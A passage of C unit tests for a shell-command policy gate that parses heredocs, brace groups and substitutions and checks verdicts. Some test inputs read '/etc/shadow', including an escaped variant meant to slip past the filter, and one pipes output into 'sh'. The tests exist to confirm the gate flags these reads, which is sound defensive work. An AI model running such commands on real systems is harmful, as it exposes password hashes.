  sg_gate_free(gate);
}

TEST(posix_brace_group_document_pipeline_policy_contract) {
  const char *command =
      "{ printf one; cat; } <<EOF | sort > /tmp/brace.out 2>>/tmp/brace.err\n"
      "payload\n"
      "EOF";
  const char *rules[] = {"printf *", "cat", "sort"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[2].netargv, "4:sort,");
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[1].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[2].group_kinds == SHELL_GROUP_NONE);
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(brace_group_redirect_and_operator_metadata_contract) {
  static const struct {
    const char *command;
    uint32_t subcommand_count;
  } cases[] = {
      {"{ cat <<<value; printf after; }", 2},
      {"{ cat <<EOF; printf after; }\npayload\nEOF\n", 2},
      {"{ cat || printf after; }", 2},
      {"{ cat | printf after; }", 2},
  };
  const char *rules[] = {"cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == cases[i].subcommand_count);
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      ASSERT(result.subcommands[command].group_depth == 1);
      ASSERT(result.subcommands[command].group_kinds == SHELL_GROUP_BRACE);
    }
  }
  sg_gate_free(gate);
}

TEST(nested_brace_group_canonical_policy_contract) {
  const char *command =
      "{ { echo one; } | cat; printf two; } > /tmp/nested-brace.out";
  const char *rules[] = {"echo *", "cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,3:two,");
  ASSERT(result.subcommands[0].group_depth == 2);
  ASSERT(result.subcommands[1].group_depth == 1);
  ASSERT(result.subcommands[2].group_depth == 1);
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[1].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[2].group_kinds == SHELL_GROUP_BRACE);
  sg_gate_free(gate);
}

TEST(brace_group_maximum_depth_contract) {
  char command[(SHELL_MAX_GROUPS + 1) * 5 + 8];
  size_t length = 0;
  for (uint32_t i = 0; i < SHELL_MAX_GROUPS; i++) {
    memcpy(command + length, "{ ", 2);
    length += 2;
  }
  memcpy(command + length, "cat", 3);
  length += 3;
  for (uint32_t i = 0; i < SHELL_MAX_GROUPS; i++) {
    memcpy(command + length, "; }", 3);
    length += 3;
  }
  command[length] = '\0';

  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].group_depth == SHELL_MAX_GROUPS);
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);

  memmove(command + 2, command, length + 1);
  memcpy(command, "{ ", 2);
  length += 2;
  memcpy(command + length, "; }", 3);
  length += 3;
  command[length] = '\0';
  memset(&result, 0xA5, sizeof(result));
  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_PARSE);
  sg_gate_free(gate);
}

TEST(strict_heredoc_completion_contract) {
  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  const char *incomplete = "{ cat; } <<-'EOF'\n\tbody\n";
  ASSERT(eval_cmd(gate, incomplete, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);

  memset(&result, 0, sizeof(result));
  const char *mixed_incomplete = "{ cat; } <<E'OF'\nbody\n";
  ASSERT(eval_cmd(gate, mixed_incomplete, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);

  memset(&result, 0, sizeof(result));
  const char *complete = "{ cat; } <<E'OF' <<-\\D'ONE'\r\n"
                         "body\r\n"
                         "EOF\r\n"
                         "\tsecond\r\n"
                         "\tDONE\r\n";
  ASSERT_SG_OK(eval_cmd(gate, complete, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
  sg_gate_free(gate);
}

TEST(canonical_heredoc_delimiter_contract) {
  static const char *const commands[] = {
      "cat << EOF\nbody\nEOF\nprintf after\n",
      "cat <<\"E\\qF\"\nbody\nE\\qF\nprintf after\n",
      "cat <<\"A B\"\nbody\nA B\nprintf after\n",
      "cat <<A\\ B\nbody\nA B\nprintf after\n",
      "cat <<''\n\nprintf after\n",
      ("cat << EOF <<-\"F\"\r\none\r\nEOF\r\n\ttwo\r\n\tF\r\n"
       "printf after\r\n"),
  };
  const char *rules[] = {"cat", "printf after"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  for (size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, commands[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
           !result.requires_substitution_evaluation &&
           !result.has_dynamic_substitution_io);
    ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
    ASSERT_STR(result.subcommands[1].netargv, "6:printf,5:after,");
  }
  sg_gate_free(gate);
}

TEST(brace_local_document_policy_contract) {
  const char *rules[] = {"cat", "printf after"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  static const char *const commands[] = {
      "{ cat <<\"A B\"; printf after; }\nbody\nA B\n",
      "{ cat <<<value; printf after; }",
  };
  for (size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, commands[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
    ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
    ASSERT_STR(result.subcommands[1].netargv, "6:printf,5:after,");
  }
  sg_gate_free(gate);
}

TEST(nested_composition_matrix) {
  static const struct {
    const char *name;
    const char *rules[6];
    size_t rule_count;
    const char *deny;
    const char *command;
    sg_verdict_t verdict;
    size_t count;
    int32_t parents[5];
    sg_verdict_t subcommand_verdicts[5];
  } cases[] = {
      {"nested command substitutions",
       {"echo *", "printf x $(whoami)", "whoami"},
       3,
       NULL,
       "echo $(printf x $(whoami))",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {-1, 0, 1},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW_CONDITIONAL,
        SG_VERDICT_ALLOW}},
      {"multiple substitutions share parent",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id) $(pwd)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {-1, 0, 0},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"adjacent substitutions share parent",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id)$(pwd)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {-1, 0, 0},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"embedded adjacent substitutions",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo prefix$(id)suffix$(pwd)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {-1, 0, 0},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"mixed substitution forms",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id)`pwd`",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {-1, 0, 0},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"process substitution feeds pipeline",
       {"cat *", "printf x", "sort"},
       3,
       NULL,
       "cat <(printf x) | sort",
       SG_VERDICT_ALLOW,
       3,
       {-1, 0, -1},
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"odd escaped process close",
       {"cat *", "printf *"},
       2,
       NULL,
       "cat <(printf \\))",
       SG_VERDICT_ALLOW,
       2,
       {-1, 0},
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"even escaped process close",
       {"cat *", "printf *"},
       2,
       NULL,
       "cat <(printf \\\\)",
       SG_VERDICT_ALLOW,
       2,
       {-1, 0},
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"substitution precedes boolean stage",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id) && pwd",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {-1, 0, -1},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"pipeline inside substitution",
       {"echo *", "cat #path", "sort"},
       3,
       NULL,
       "echo $(cat /tmp/a | sort)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {-1, -1, 0},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"unmatched nested pipeline stage",
       {"echo *", "cat #path"},
       2,
       NULL,
       "echo $(cat /tmp/a | sort)",
       SG_VERDICT_UNDETERMINED,
       3,
       {-1, -1, 0},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW,
        SG_VERDICT_UNDETERMINED}},
      {"denied nested pipeline stage",
       {"echo *", "cat #path", "sort"},
       3,
       "sort",
       "echo $(cat /tmp/a | sort)",
       SG_VERDICT_DENY,
       3,
       {-1, -1, 0},
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_DENY}},
      {"nested process substitutions",
       {"cat *", "sort *", "cat #path"},
       3,
       NULL,
       "cat <(sort <(cat /tmp/a))",
       SG_VERDICT_ALLOW,
       3,
       {-1, 0, 1},
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = gate_with_rules(cases[i].rules, cases[i].rule_count);
    ASSERT(gate != NULL);
    /* The outer command is evaluated independently from its executable
     * substitutions. Keep an explicit outer rule so these rows exercise the
     * nested verdict aggregation rather than outer-pattern matching. */
    ASSERT_SG_OK(add_exact_outer_rule(gate, cases[i].command));
    if (cases[i].deny)
      ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, cases[i].deny));
    ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    if (result.subcommand_count != cases[i].count) {
      fprintf(stderr, "%s: got %u subcommands, expected %zu\n", cases[i].name,
              result.subcommand_count, cases[i].count);
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        fprintf(stderr, "  [%u] '%s' parent=%d\n", j,
                result.subcommands[j].display_command,
                result.subcommands[j].substitution_consumer_index);
      fail_count++;
      sg_gate_free(gate);
      continue;
    }
    if (result.verdict != cases[i].verdict) {
      fprintf(stderr, "%s: got verdict %s\n", cases[i].name,
              sg_verdict_name(result.verdict));
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        fprintf(stderr, "  [%u] '%s' verdict=%s parent=%d\n", j,
                result.subcommands[j].display_command,
                sg_verdict_name(result.subcommands[j].verdict),
                result.subcommands[j].substitution_consumer_index);
      fail_count++;
      sg_gate_free(gate);
      continue;
    }
    ASSERT(result.has_dynamic_substitution_io);
    for (size_t j = 0; j < cases[i].count; j++) {
      ASSERT(result.subcommands[j].substitution_consumer_index ==
             cases[i].parents[j]);
      if (result.subcommands[j].verdict != cases[i].subcommand_verdicts[j])
        fprintf(stderr, "%s command %zu: got %s, expected %s\n", cases[i].name,
                j, sg_verdict_name(result.subcommands[j].verdict),
                sg_verdict_name(cases[i].subcommand_verdicts[j]));
      ASSERT(result.subcommands[j].verdict == cases[i].subcommand_verdicts[j]);
      ASSERT(result.subcommands[j].display_command != NULL);
    }
    sg_gate_free(gate);
  }
}

TEST(arithmetic_substitution_dependency) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"echo *", "id"}, 2);
  ASSERT(gate != NULL);
  /* Arithmetic is rejected by default, but clearing the feature mask lets
   * this row exercise the nested executable substitution itself. */
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "echo $(( $(id) + 1 ))", &result));
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].substitution_consumer_index == -1);
  ASSERT(result.subcommands[1].substitution_consumer_index == 0);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.subcommands[1].verdict == SG_VERDICT_ALLOW);
  ASSERT(result.requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(dynamic_substitution_flow_contract) {
  static const char *rules[] = {
      "echo *", "sleep *", "printf *",  "printf * *", "id",  "./clock",
      "cat",    "cat *",   "cat #path", "pwd",        "date"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result;
  ASSERT_SG_OK(
      eval_cmd(gate, "echo $( { sleep 2; printf q; } | ./clock )", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 4);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].substitution_consumer_index == -1);
  ASSERT(result.subcommands[2].substitution_consumer_index == -1);
  ASSERT(result.subcommands[3].substitution_consumer_index == 0);

  /* A syntactic substitution is not automatically a live dynamic I/O flow:
   * descriptor closes and diversions can disconnect it before its bytes reach
   * a shell word or process-substitution consumer. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf x >&-)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf x 1>&2)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf x 2>&1 1>&2)", &result));
  ASSERT(result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "printf x > >(sh 0<&-)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "printf x > >(sh 0<&0)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf first; printf second)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].substitution_consumer_index == -1);
  ASSERT(result.subcommands[2].substitution_consumer_index == -1);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(<\"/etc/shadow\")", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[0].substitution_consumer_index == -1);
  ASSERT(result.subcommands[0].read_count == 0);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</etc/shadow)", &result));
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</etc/sha\\dow)", &result));
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(<\"$dynamic_path\")", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</tmp/direct)$(id)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[0].substitution_consumer_index == -1);
  ASSERT(result.subcommands[1].substitution_consumer_index == 0);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(< <(printf q))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);

  /* The nested printf selects a pathname, while the selected file's contents
   * are what later enter echo's shell word. Do not make the filename producer
   * itself a second-inspection consumer. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(<$(printf /tmp/dynamic-name))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation &&
         result.subcommands[1].substitution_consumer_index == -1);

  ASSERT_SG_OK(eval_cmd(gate, "{ echo $(</tmp/group-input); }", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].group_depth == 1);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[0].substitution_consumer_index == -1);

  ASSERT_SG_OK(
      eval_cmd(gate, "echo $( { printf $(</tmp/nested-input); } )", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].requires_substitution_evaluation);
  ASSERT(result.subcommands[0].substitution_consumer_index == -1);
  ASSERT(result.subcommands[1].substitution_consumer_index == -1);

  ASSERT_SG_OK(eval_cmd(gate, "printf value 2> >(cat)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(!result.requires_substitution_evaluation);
  ASSERT(result.has_dynamic_substitution_io);
  ASSERT(result.subcommand_count == 2);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!result.subcommands[1].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].has_dynamic_substitution_io);
  ASSERT(result.subcommands[0].substitution_consumer_index == -1);

  ASSERT_SG_OK(eval_cmd(gate, "cat <(cat <<EOF\n)\nEOF\n)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(cat <<EOF\n)\nEOF\n)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation);

  /* Arithmetic shifts are not heredocs, while their enclosing substitution
   * still carries the correct shell-word or dynamic-descriptor semantics. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf '%s' $((1 << 2)))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <(printf '%s' $((1 << 2)))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "{ echo $((1 << 2)); }", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.subcommand_count == 1 &&
         result.subcommands[0].group_depth == 1);

  /* A substitution in a redirect selects an I/O pathname. It remains visible
   * on the redirect owner, but it is not shell-word content to inspect again.
   */
  ASSERT_SG_OK(eval_cmd(gate, "cat >$(id)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2);
  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation &&
         result.subcommands[0].substitution_consumer_index == -1 &&
         result.subcommands[1].substitution_consumer_index == -1);

  ASSERT_SG_OK(
      eval_cmd(gate, "{ echo ok; } >prefix$(printf /tmp/out)suffix", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2);
  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation &&
         result.subcommands[0].substitution_consumer_index == -1 &&
         result.subcommands[1].substitution_consumer_index == -1);

  ASSERT_SG_OK(eval_cmd(gate, "echo $( { cat /etc/shadow; } )", &result));
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<-EOF\r\n\t$(id)\r\n\tEOF\r\n", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].substitution_consumer_index == 0);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<'EOF'\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(!result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<\\EOF\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(!result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF </dev/null\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(
      eval_cmd(gate, "cat <<A <<-B\n$(id)\nA\n\t$(pwd)\n\tB\n", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].substitution_consumer_index == -1);
  ASSERT(result.subcommands[2].substitution_consumer_index == 0);

  ASSERT_SG_OK(
      eval_cmd(gate, "cat <<EOF\n$(printf one; printf two)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].substitution_consumer_index == -1);
  ASSERT(result.subcommands[2].substitution_consumer_index == -1);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF\n$(</etc/shadow)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);
  ASSERT(result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE);
  bool heredoc_sensitive_owner = false;
  for (uint32_t i = 0; i < result.violation_count; i++)
    heredoc_sensitive_owner =
        heredoc_sensitive_owner ||
        (result.violations[i].type == SG_VIOL_SUBST_SENSITIVE &&
         result.violations[i].command_node_index == 0);
  ASSERT(heredoc_sensitive_owner);

  /* The heredoc is an internal transport node. The sensitive substitution
   * belongs to the GROUP-owned descriptor and must reach every simple command
   * which inherits that group context. */
  ASSERT_SG_OK(
      eval_cmd(gate, "{ cat; cat; } <<EOF\n$(</etc/shadow)\nEOF", &result));
  ASSERT(
      result.requires_substitution_evaluation && result.subcommand_count == 2 &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[1].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "{ cat; cat; } <<EOF\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].requires_substitution_evaluation);
  ASSERT(!result.subcommands[2].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(
      gate, "cat <<EOF\n$( { sleep 2; printf q; } | ./clock )\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 4);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[3].substitution_consumer_index == 0);
  sg_gate_free(gate);
}

TEST(herestring_and_transformed_substitution_provenance) {
  static const char *rules[] = {"echo *", "sh",       "cat",       "cat #path",
                                "sed *",  "printf *", "printf * *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
